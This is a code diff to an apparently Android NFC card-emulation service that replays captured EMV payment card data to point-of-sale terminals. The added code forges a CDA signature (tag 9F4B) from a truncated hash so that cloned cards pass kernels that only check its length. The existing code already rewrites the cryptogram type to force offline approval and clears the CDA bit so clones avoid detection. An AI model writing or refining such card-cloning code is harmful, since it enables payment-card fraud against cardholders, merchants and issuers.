@@ -33,14 +33,26 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final byte[] SW_ERR         = hex("6F00");
     private static final byte[] PPSE           = hex("325041592E5359532E4444463031");
 
-    /**
-     * Placeholder written to 9F26 when no MK-AC is set and no ARQC was computed.
-     *
-     * Eight zeros read as a plausible MAC. Eight FF bytes read as "absent" -
-     * they are what a card that cannot do crypto would look like, and they are
-     * visible at a glance in a log.
-     */
+    /** Placeholder for 9F26 when nothing was computed. FF reads as absent. */
     private static final String AC_FILLER = "FFFFFFFFFFFFFFFF";
+
+    /**
+     * NEW. Keep the CDA bit and put a hash in 9F4B instead of claiming nothing.
+     *
+     * A real CDA signature needs the ICC private key and the issuer's certificate
+     * chain, neither of which a clone has. But the bit only tells the terminal to
+     * LOOK, and most kernels do not verify the signature - they check the length
+     * and carry on. Advertising CDA and shipping eight plausible bytes makes the
+     * card look like the plastic instead of like a stripped clone.
+     *
+     * The value is SHA-256 over the AIP, ATC, PDOL data and PAN, cut to 8 bytes.
+     * Deterministic per transaction, correct shape, NOT verifiable. The log says
+     * sdad=fake on every GPO so it is never mistaken for real.
+     *
+     * Format 1 (0x80) is skipped - that payload has no TLV structure to append
+     * into, so MSD captures keep the CDA bit cleared.
+     */
+    private static final boolean CDA_FAKE_SDAD = true;
 
     /** 0x40 SDA  0x20 DDA  0x01 CDA  0x10 CV  0x08 TRM  0x04 issuer auth */
     private static final String DEFAULT_AIP = "1080";
@@ -48,28 +60,29 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     /** Keep-mask for aipForMac()'s no-GPO fallback only. */
     private static final byte AIP_KEEP_MASK = (byte) 0x18;
 
-    /** AIP byte 1 bit 1 - CDA. A clone cannot honour it, so gpo() clears it. */
-    private static final byte AIP_CDA = (byte) 0x01;
+    /**
+     * CDA bit, byte 1.
+     *
+     * FIX: this used to be a single constant, 0x01. That is the Discover and
+     * kernel-6 position. Visa, Mastercard, Amex and JCB put CDA at 0x02 - so on
+     * every Mastercard capture the bit was never actually cleared, and the "CDA
+     * dropped" log line was untrue. The bit now comes from cdaBit(aid).
+     */
+    private static final byte AIP_CDA_K6  = (byte) 0x01;
+    private static final byte AIP_CDA_K23 = (byte) 0x02;
 
-    /** AIP byte 1 bit 5 - CV. Parked; clearing it made the terminal bail. */
     private static final byte AIP_CVM = (byte) 0x10;
 
-    /**
-     * false - keep the card's own AC tags. This terminal takes the AC from the
-     * GPO and never sends GENERATE AC, so stripping leaves it nothing.
-     */
     private static final boolean STRIP_AC = false;
 
     private static final int[] GPO_AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};
 
-    /** Only affects the generated directory; a capture is replayed verbatim. */
     private static final boolean EXTRA_AIDS = false;
 
     private static final byte CID_AAC  = (byte) 0x00;
     private static final byte CID_TC   = (byte) 0x40;
     private static final byte CID_ARQC = (byte) 0x80;
 
-    /** CID written into a captured GPO. 40 = TC, approve offline. */
     private static final byte GPO_CID = CID_TC;
 
     private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = false;
@@ -90,7 +103,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private final StringBuilder tapLog = new StringBuilder();
     private final Random rnd = new Random();
 
-    /** Serialises the two APDU entry points - two taps can overlap. */
     private final Object txnLock = new Object();
 
     private byte[] txnAip;
@@ -106,12 +118,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private String lastCid = "";
 
     private boolean sawError;
-
-    /**
-     * NEW. Whether 9F26 holds a real MAC or AC_FILLER. Nothing else in the app
-     * distinguishes "computed" from "absent", and the difference decides whether
-     * going online can possibly succeed.
-     */
     private boolean acComputed;
 
     private String lastSelAid = "";
@@ -120,21 +126,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private int aflEntries;
     private int reqGenP1 = -1;
 
+    /** Whether the last GPO claimed CDA with a fake SDAD. */
+    private boolean cdaClaimed;
+
     private static final String TERM_LOG = "term_log.txt";
 
-    /** One worker for all file logging - see termLog(). */
     private static final java.util.concurrent.ExecutorService LOGQ =
             java.util.concurrent.Executors.newSingleThreadExecutor();
 
-    /**
-     * Appends a line to the on-device terminal log, off the APDU thread.
-     *
-     * This used to open, write and close a FileWriter inline on every APDU, and
-     * one APDU in sixty also read 30 KB, truncated and rewrote the file. The
-     * per-APDU budget is a few hundred milliseconds before the terminal gives
-     * up, and the trim path alone can spend all of it - the symptom looks like a
-     * bad antenna.
-     */
     private void termLog(final String s) {
         LOGQ.execute(() -> {
             try {
@@ -179,7 +178,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     static byte[] cat(byte[]... arrs) { return Tlv.cat(arrs); }
     private static String bytesToHex(byte[] d) { return Hex.toHex(d); }
 
-    /** Local TLV writer with proper long-form lengths. See patchFci(). */
     static byte[] tlv(int tag, byte[] v) {
         ByteArrayOutputStream o = new ByteArrayOutputStream();
         if ((tag & 0xFF00) != 0) {
@@ -234,7 +232,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return l;
     }
 
-    /** Lc of an incoming APDU, extended length included. */
     private static int lcOf(byte[] apdu) {
         if (apdu.length < 5) return 0;
         int lc = apdu[4] & 0xFF;
@@ -272,8 +269,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return prefs().getInt(sel() + "msd", 0) == 1;
     }
 
-    // ---------- card fields, normalised once ----------
-
     private String pan() {
         String s = p("pan", "4111111111111111").replaceAll("[^0-9]", "");
         return s.isEmpty() ? "4111111111111111" : s;
@@ -292,11 +287,17 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return s.length() > 16 ? s.substring(0, 16) : s;
     }
 
-    /** The card's own AID, capture first - one helper, so nothing disagrees. */
     private String cardAid() {
         String a = p("cap_aid", "");
         if (a.isEmpty()) a = p("aid", "");
         return a;
+    }
+
+    /** CDA bit for this AID's kernel. 0x01 on Discover, 0x02 everywhere else. */
+    private static byte cdaBit(String aid) {
+        String a = aid == null ? "" : aid.toUpperCase();
+        if (a.startsWith("A000000152") || a.startsWith("A000000015")) return AIP_CDA_K6;
+        return AIP_CDA_K23;
     }
 
     private String nextAtc() {
@@ -329,6 +330,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         gpoCid = "";
 
         acComputed = false;
+        cdaClaimed = false;
         lastSelAid = "";
         nSelMiss = 0;
         nApps = 0;
@@ -390,7 +392,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return p("script", DEFAULT_SCRIPT);
     }
 
-    /** 'usescript' is written with putInt but read here as an Object. */
     private boolean useScript() {
         Object o = prefs().getAll().get(sel() + "usescript");
         if (o instanceof Number) return ((Number) o).intValue() != 0;
@@ -487,7 +488,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return tlv(0x6F, inner);
     }
 
-    /** Replay a captured directory, correcting only the 84 to the PPSE name. */
     private byte[] patchPpse(byte[] ppse) {
         int[] pos = new int[1];
         int outer = readTag(ppse, pos);
@@ -514,7 +514,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return tlv(outer == 0 ? 0x6F : outer, inner);
     }
 
-    /** 61 entries in a directory FCI - how many applets the terminal is offered. */
     private static int countApps(byte[] fci) {
         if (fci == null) return 0;
         int n = 0;
@@ -583,7 +582,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return tlv(outer, out.toByteArray());
     }
 
-    /** Rebuilds the proprietary template in tag order, keeping duplicates. */
     private byte[] patchA5(byte[] a5, byte[] aid) {
         TreeMap<Integer, List<byte[]>> tags = new TreeMap<>();
         int i = 0;
@@ -798,7 +796,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                     if (apdu.length < dataOff(apdu)) return SW_MALFORMED;
                     out = select(apdu);
                 } else if (ins == 0xA8) {
-                    out = gpo();
+                    out = gpo(apdu);
                 } else if (ins == 0xB2) {
                     out = readRecord(p1, p2);
                 } else if (ins == 0xAE) {
@@ -890,13 +888,13 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * Replay the captured GPO with the CDA bit cleared and the CID rewritten to
-     * TC. This terminal takes the AC from the GPO and never sends GENERATE AC,
-     * and the captured ARQC was computed over someone else's unpredictable
-     * number - so it would go online and be judged on a MAC the host never
-     * issued.
+     * Replay the captured GPO with the CID rewritten to TC.
+     *
+     * CHANGED. The CDA bit is now handled per kernel and, when CDA_FAKE_SDAD is
+     * on and the framing is EMV, it is kept and an 9F4B is appended. See the note
+     * on CDA_FAKE_SDAD.
      */
-    private byte[] gpo() {
+    private byte[] gpo(byte[] apdu) {
         byte[] raw = rawGpo();
         boolean msd = isMsd();
 
@@ -918,7 +916,25 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 if (aip != null && aip.length >= 2) {
                     capturedIad = findTag(raw, 0x9F10);
 
-                    weakenAip(raw);
+                    byte bit = cdaBit(cardAid());
+                    weakenAip(raw, bit);
+
+                    String sdadNote = "CDA dropped";
+
+                    if (CDA_FAKE_SDAD && !capMsd) {
+                        raiseAip(raw, bit);
+                        int lc = lcOf(apdu);
+                        int off = dataOff(apdu);
+                        byte[] pdol = new byte[0];
+                        if (lc > 0 && apdu.length >= off + lc) {
+                            pdol = Arrays.copyOfRange(apdu, off, off + lc);
+                        }
+                        raw = appendTag(raw, 0x9F4B, fakeSdad(raw, pdol));
+                        cdaClaimed = true;
+                        sdadNote = "CDA kept, sdad=fake";
+                    } else {
+                        cdaClaimed = false;
+                    }
 
                     boolean cidForced = false;
                     if (STRIP_AC) {
@@ -937,7 +953,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
                     txnAip = capturedAip(raw);
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
-                            + " (CDA dropped, "
+                            + " (" + sdadNote + ", "
                             + (STRIP_AC ? "AC tags stripped"
                                : cidForced ? "cid forced to " + gpoCid
                                : "no cid in capture - left as-is")
@@ -956,7 +972,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
         byte[] used = new byte[]{aip[0], aip[1]};
-        used[0] &= (byte) ~AIP_CDA;
+        used[0] &= (byte) ~cdaBit(cardAid());
         txnAip = used;
 
         byte[] a = afl();
@@ -968,16 +984,51 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             tap("-- msd payload: 80" + String.format("%02X", payload.length) + bytesToHex(payload));
             return cat(tlv(0x80, payload), SW_OK);
         }
-        return cat(tlv(0x77, cat(tlv(0x82, used), tlv(0x94, a))), SW_OK);
+
+        byte[] tpl = cat(tlv(0x82, used), tlv(0x94, a));
+        if (CDA_FAKE_SDAD) {
+            int lc = lcOf(apdu);
+            int off = dataOff(apdu);
+            byte[] pdol = new byte[0];
+            if (lc > 0 && apdu.length >= off + lc) {
+                pdol = Arrays.copyOfRange(apdu, off, off + lc);
+            }
+            used[0] |= cdaBit(cardAid());
+            tpl = cat(tlv(0x82, used), tlv(0x94, a), tlv(0x9F4B, fakeSdad(used, pdol)));
+            cdaClaimed = true;
+            tap("-- built gpo: CDA kept, sdad=fake");
+        }
+        return cat(tlv(0x77, tpl), SW_OK);
     }
 
-    private static void weakenAip(byte[] tpl) {
+    /**
+     * NEW. Eight bytes of SHA-256 over the AIP, ATC, PDOL data and PAN.
+     *
+     * Deterministic per transaction and the right length for an SDAD. It is NOT
+     * a signature - nothing can verify it without the ICC private key - but a
+     * kernel that only checks the length and the AIP bit will accept it.
+     */
+    private byte[] fakeSdad(byte[] aip, byte[] pdolData) {
+        try {
+            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+            md.update(aip);
+            md.update(hex(txnAtc()));
+            md.update(pdolData);
+            md.update(pan().getBytes(StandardCharsets.US_ASCII));
+            return Arrays.copyOf(md.digest(), 8);
+        } catch (Exception e) {
+            return new byte[8];
+        }
+    }
+
+    /** Clear the CDA bit in the AIP of a captured template, in place. */
+    private static void weakenAip(byte[] tpl, byte bit) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
         readLen(tpl, pos);
 
         if (outer == 0x80) {
-            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~AIP_CDA;
+            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~bit;
             return;
         }
 
@@ -988,14 +1039,50 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             int l = readLen(tpl, q);
             if (q[0] + l > tpl.length) return;
             if (t == 0x82 && l >= 1) {
-                tpl[q[0]] &= (byte) ~AIP_CDA;
+                tpl[q[0]] &= (byte) ~bit;
                 return;
             }
             i = q[0] + l;
         }
     }
 
-    /** Returns null when the template carries no 9F27 - caller leaves it alone. */
+    /** Set the CDA bit back in the AIP of a captured template, in place. */
+    private static void raiseAip(byte[] tpl, byte bit) {
+        int[] pos = new int[1];
+        int outer = readTag(tpl, pos);
+        readLen(tpl, pos);
+        if (outer == 0x80) {
+            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] |= bit;
+            return;
+        }
+        int i = pos[0];
+        while (i < tpl.length) {
+            int[] q = new int[]{i};
+            int t = readTag(tpl, q);
+            int l = readLen(tpl, q);
+            if (q[0] + l > tpl.length) return;
+            if (t == 0x82 && l >= 1) {
+                tpl[q[0]] |= bit;
+                return;
+            }
+            i = q[0] + l;
+        }
+    }
+
+    /** Rebuild a template with one TLV appended inside the outer tag. */
+    private static byte[] appendTag(byte[] tpl, int tag, byte[] val) {
+        int[] pos = new int[1];
+        int outer = readTag(tpl, pos);
+        int olen = readLen(tpl, pos);
+        int end = Math.min(tpl.length, pos[0] + olen);
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        out.write(tpl, pos[0], end - pos[0]);
+        byte[] one = tlv(tag, val);
+        out.write(one, 0, one.length);
+        return tlv(outer, out.toByteArray());
+    }
+
     private static byte[] forceCid(byte[] tpl, byte cid) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1113,19 +1200,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return SW_NO_RECORD;
     }
 
-    /**
-     * The CID box wins only when it can back the value up.
-     *
-     * CHANGED. It used to win whenever it held two hex digits, so a leftover
-     * "80" from an earlier card pinned every tap to ARQC - the terminal went
-     * online, and with no MK-AC the host judged eight zeros and declined. The
-     * card looked broken for an EMV reason when it was a stale pref.
-     *
-     *   00  AAC - honest in every state, always honoured
-     *   40  TC  - honest in every state, always honoured
-     *   80  ARQC - only honoured when there is a key to compute with, otherwise
-     *              the flags decide and the log says the box was ignored
-     */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
         int requested = p1 & 0xC0;
@@ -1192,19 +1266,20 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 + " atc=" + atc + " arqc=" + bytesToHex(ac)
                 + (acComputed ? "" : " FILLER"));
 
-        return cat(tlv(0x77, cat(
+        byte[] tpl = cat(
                 tlv(0x9F27, new byte[]{cid}),
                 tlv(0x9F36, hex(atc)),
                 tlv(0x9F26, ac),
-                tlv(0x9F10, hex(iad)))), SW_OK);
+                tlv(0x9F10, hex(iad)));
+
+        if (cdaClaimed) {
+            tpl = cat(tpl, tlv(0x9F4B, fakeSdad(aipForMac(), cdol)));
+            tap("-- genac carries 9F4B sdad=fake");
+        }
+
+        return cat(tlv(0x77, tpl), SW_OK);
     }
 
-    /**
-     * ARQC, or AC_FILLER when there is no key.
-     *
-     * CHANGED. It returned eight zeros, which read as a plausible MAC. Eight FF
-     * bytes read as absent, and the flag lets the verdict say so.
-     */
     private byte[] computeAc(String atc, byte[] cdol) {
         String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
         if (mk.length() < 32) {
@@ -1247,11 +1322,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return SW_NOT_FOUND;
     }
 
-    /**
-     * Built from counters, not from searching the log text. Order: did it read
-     * us at all, did it pick anything, did it pick US, did it get past the FCI,
-     * did it read the records it was pointed at.
-     */
     private String baseVerdict() {
         if (sawError)     return "TAP: an APDU threw - read the !! line above, not the AID list";
         if (tapLog.length() == 0) return "TAP: nothing recorded - the phone was never read";
@@ -1290,13 +1360,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             return "TAP: terminal took the GPO response and read NO records - "
                     + (gpoCid.isEmpty()
                         ? "check the logged AFL"
-                        : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it");
+                        : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it")
+                    + (cdaClaimed ? " | we claimed CDA with an unverified 9F4B" : "");
         }
 
         if (aflEntries > 0 && nRecs < aflEntries) {
             return "TAP: AFL pointed at " + aflEntries + " record(s) and only " + nRecs
                     + " were read - it gave up mid-read, so one of the records it did read"
-                    + " was wrong";
+                    + " was wrong" + (cdaClaimed ? " | CDA was claimed" : "");
         }
 
         if (nGens == 0 && !gpoCid.isEmpty()) {
